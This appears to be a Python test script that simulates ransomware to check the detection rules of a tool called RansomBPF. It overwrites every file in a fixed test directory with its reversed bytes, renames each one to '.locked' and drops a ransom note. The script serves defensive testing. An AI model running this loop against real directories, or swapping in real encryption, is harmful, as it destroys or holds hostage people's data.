#!/usr/bin/env python3
"""
ransom_simulator.py - Ransomware Behavior Simulator
Version: 0.9.0

Description:
    Simulates a ransomware attack pattern to validate RansomBPF detection rules.
    It mimics real-world ransomware behavior by:
    1. Iterating through a target directory.
    2. Encrypting file content (using a reversible XOR/Reverse algorithm).
    3. Renaming files with a suspicious extension (e.g., .locked).
    4. Dropping a ransom note.

    It intentionally introduces delays to test 'Rate Limiting' (H1) and
    'Context Awareness' (H2) heuristics.

Usage:
    python3 ransom_simulator.py
"""

import os
import time
import datetime

# --- ATTACKER CONFIGURATION ---
TARGET_DIR = "/home/developer/test_files"
ENCRYPTED_EXTENSION = ".locked"
RANSOM_NOTE_NAME = "RESTORE_FILES.txt"
RANSOM_NOTE_CONTENT = """
ATTENTION!
All your files have been encrypted by the RansomBPF Test Suite.
Contact your system administrator for the decryption key.
This is a simulation. No actual harm has been done.
"""

def simulate_encryption_activity():
    """
    Main attack loop. Encrypts files in the target directory one by one.
    """

    # 1. Target Validation
    if not os.path.exists(TARGET_DIR):
        print(f"[ERROR] Target directory not found: {TARGET_DIR}")
        return

    start_time = datetime.datetime.now()
    print(f"[*] Starting Attack Simulation... TIMESTAMP: {start_time.strftime('%Y-%m-%d %H:%M:%S.%f')}")
    print(f"[*] Target: {TARGET_DIR}")

    # List eligible files (exclude already encrypted ones and the script itself)
    files = [f for f in os.listdir(TARGET_DIR) if os.path.isfile(os.path.join(TARGET_DIR, f))]
    files = [f for f in files if not f.endswith(ENCRYPTED_EXTENSION) and f != "ransom_simulator.py"]

    print(f"[*] Found {len(files)} victim files.")
    time.sleep(1) # Pause before strike

    for i, filename in enumerate(files):
        full_path = os.path.join(TARGET_DIR, filename)

        try:
            # --- STEP 1: READ AND ENCRYPT (Content Manipulation) ---
            # Using simple reversal as a mock encryption algorithm
            with open(full_path, "rb+") as f:
                content = f.read()
                encrypted_content = content[::-1]
                f.seek(0)
                f.write(encrypted_content)
                f.truncate()

            # --- STEP 2: RENAME (Extension Change) ---
            new_path = full_path + ENCRYPTED_EXTENSION
            os.rename(full_path, new_path)

            # Log operation time for forensic verification
            current_time = datetime.datetime.now().strftime('%H:%M:%S.%f')
            print(f"[+] Encrypted ({i+1}/{len(files)}) - {current_time}: {filename} -> {filename}{ENCRYPTED_EXTENSION}")

            # Artificial delay to test 'Write Burst' (H1) heuristic sensitivity
            # 20ms delay creates ~50 ops/sec, which should trigger the threshold.
            time.sleep(0.02)

        except Exception as e:
            print(f"[!] Error processing {filename}: {e}")

    # --- STEP 3: DROP RANSOM NOTE ---
    note_path = os.path.join(TARGET_DIR, RANSOM_NOTE_NAME)
    with open(note_path, "w") as f:
        f.write(RANSOM_NOTE_CONTENT)

    print(f"[*] Ransom note dropped: {note_path}")
    print("[*] ATTACK SIMULATION COMPLETED (Process finished naturally).")

if __name__ == "__main__":
    simulate_encryption_activity()